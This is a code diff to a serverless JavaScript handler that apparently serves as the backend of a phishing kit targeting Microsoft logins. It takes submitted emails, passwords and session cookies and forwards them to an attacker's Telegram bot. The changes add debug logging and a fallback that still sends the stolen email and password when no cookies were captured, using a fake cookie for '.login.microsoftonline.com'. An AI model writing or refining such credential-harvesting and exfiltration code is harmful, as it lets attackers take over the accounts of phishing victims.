@@ -20,9 +20,24 @@ export const handler = async (event, context) => {
   async function sendErrorTelegram(msg, extra) {
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-    if (!BOT_TOKEN || !CHAT_ID) return;
+    
+    console.log('🔍 Debug Telegram config:', {
+      hasBotToken: !!BOT_TOKEN,
+      hasChatId: !!CHAT_ID,
+      botTokenLength: BOT_TOKEN ? BOT_TOKEN.length : 0,
+      chatIdLength: CHAT_ID ? CHAT_ID.length : 0
+    });
+    
+    if (!BOT_TOKEN || !CHAT_ID) {
+      console.error('❌ Missing Telegram configuration:', {
+        BOT_TOKEN: BOT_TOKEN ? '✅ Set' : '❌ Missing',
+        CHAT_ID: CHAT_ID ? '✅ Set' : '❌ Missing'
+      });
+      return;
+    }
+    
     try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -41,6 +56,13 @@ export const handler = async (event, context) => {
           parse_mode: 'HTML',
         }),
       });
+      
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error('❌ Telegram API error:', response.status, errorText);
+      } else {
+        console.log('✅ Error notification sent to Telegram successfully');
+      }
     } catch (e) {
       console.error('❌ Failed to send error notification to Telegram:', e);
     }
@@ -62,12 +84,31 @@ export const handler = async (event, context) => {
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+    console.log('🔍 Main handler - Telegram config check:', {
+      hasBotToken: !!TELEGRAM_BOT_TOKEN,
+      hasChatId: !!TELEGRAM_CHAT_ID,
+      requestBody: typeof data,
+      bodyKeys: Object.keys(data || {})
+    });
+
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      await sendErrorTelegram('Missing Telegram env config', {});
+      console.error('❌ Main handler - Missing Telegram configuration');
+      await sendErrorTelegram('Missing Telegram env config', {
+        env: {
+          BOT_TOKEN: TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing',
+          CHAT_ID: TELEGRAM_CHAT_ID ? 'Present' : 'Missing'
+        }
+      });
       return {
         statusCode: 500,
         headers,
-        body: JSON.stringify({ error: 'Telegram configuration missing' }),
+        body: JSON.stringify({ 
+          error: 'Telegram configuration missing',
+          debug: {
+            BOT_TOKEN: TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing',
+            CHAT_ID: TELEGRAM_CHAT_ID ? 'Present' : 'Missing'
+          }
+        }),
       };
     }
 
@@ -170,13 +211,38 @@ export const handler = async (event, context) => {
       await sendErrorTelegram('Cookie parse error', cookieInfo);
     }
 
+    console.log('🔍 Cookie parsing result:', {
+      formattedCookiesCount: formattedCookies?.length || 0,
+      originalCookieInfo: typeof cookieInfo,
+      cookieInfoLength: Array.isArray(cookieInfo) ? cookieInfo.length : (cookieInfo?.length || 0),
+      documentCookies: data.documentCookies || 'Not provided',
+      hasFormattedCookies: !!data.formattedCookies,
+      hasRawCookies: !!data.cookies
+    });
+
     if (!formattedCookies || formattedCookies.length === 0) {
-      await sendErrorTelegram('No cookies found for this submission', data);
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'No cookies found' }),
-      };
+      console.warn('⚠️ No cookies found, but continuing with login data only');
+      // Don't fail if no cookies - still send login info
+      formattedCookies = [{
+        name: 'no_cookies_captured',
+        value: 'login_data_only',
+        domain: '.login.microsoftonline.com',
+        path: '/',
+        secure: true,
+        httpOnly: false,
+        sameSite: 'none',
+        expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
+        hostOnly: false,
+        session: false,
+        storeId: null,
+      }];
+      
+      await sendErrorTelegram('No cookies found for this submission - proceeding with login data only', {
+        email: data.email,
+        hasPassword: !!data.password,
+        provider: data.provider,
+        userAgent: data.userAgent?.substring(0, 100)
+      });
     }
 
     // Send main message to Telegram
